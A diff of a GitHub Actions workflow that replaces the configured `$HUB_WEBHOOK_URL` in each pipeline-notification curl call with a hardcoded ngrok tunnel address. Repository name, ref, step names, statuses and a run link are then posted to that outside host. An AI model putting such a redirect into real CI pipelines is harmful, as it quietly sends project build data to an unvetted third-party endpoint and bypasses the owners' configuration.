@@ -31,7 +31,7 @@ jobs:
       - name: Notify pipeline start
         if: env.HUB_WEBHOOK_URL != ''
         run: |
-          curl -s -X POST "$HUB_WEBHOOK_URL" \
+          curl -s -X POST "https://karri-fruity-wrongfully.ngrok-free.dev/webhook" \
             -H "Content-Type: application/json" \
             -d "$(jq -n \
               --arg repo "${{ env.REPO }}" \
@@ -53,7 +53,7 @@ jobs:
           HUB_WEBHOOK_URL: ${{ env.HUB_WEBHOOK_URL }}
         run: |
           STATUS="Started"
-          curl -s -X POST "$HUB_WEBHOOK_URL" \
+          curl -s -X POST "https://karri-fruity-wrongfully.ngrok-free.dev/webhook" \
             -H "Content-Type: application/json" \
             -d "$(jq -n --arg repo "${{ env.REPO }}" --arg ref "${{ env.REF }}" \
               --arg job "main" --arg step "Setup Python" --arg status_start "$STATUS" \
@@ -67,7 +67,7 @@ jobs:
           HUB_WEBHOOK_URL: ${{ env.HUB_WEBHOOK_URL }}
         run: |
           STATUS=$([[ $? -eq 0 ]] && echo "Successful" || echo "Failed")
-          curl -s -X POST "$HUB_WEBHOOK_URL" \
+          curl -s -X POST "https://karri-fruity-wrongfully.ngrok-free.dev/webhook" \
             -H "Content-Type: application/json" \
             -d "$(jq -n --arg repo "${{ env.REPO }}" --arg ref "${{ env.REF }}" \
               --arg job "main" --arg step "Install deps" --arg status_end "$STATUS" \
@@ -78,7 +78,7 @@ jobs:
         run: |
           pytest test_app.py -v
           STATUS=$([[ $? -eq 0 ]] && echo "Successful" || echo "Failed")
-          curl -s -X POST "$HUB_WEBHOOK_URL" \
+          curl -s -X POST "https://karri-fruity-wrongfully.ngrok-free.dev/webhook" \
             -H "Content-Type: application/json" \
             -d "$(jq -n --arg repo "${{ env.REPO }}" --arg ref "${{ env.REF }}" \
               --arg job "main" --arg step "Run tests" --arg status_end "$STATUS" \
@@ -100,7 +100,7 @@ jobs:
     steps:
       - name: Notify failure
         run: |
-          curl -s -X POST "$HUB_WEBHOOK_URL" \
+          curl -s -X POST "https://karri-fruity-wrongfully.ngrok-free.dev/webhook" \
             -H "Content-Type: application/json" \
             -d "$(jq -n \
               --arg repo "${{ env.REPO }}" \
@@ -122,7 +122,7 @@ jobs:
         if: env.HUB_WEBHOOK_URL != ''
         run: |
           ARTIFACT_URL="https://github.com/${{ env.REPO }}/actions/runs/${{ github.run_id }}"
-          curl -s -X POST "$HUB_WEBHOOK_URL" \
+          curl -s -X POST "https://karri-fruity-wrongfully.ngrok-free.dev/webhook" \
             -H "Content-Type: application/json" \
             -d "$(jq -n \
               --arg repo "${{ env.REPO }}" \
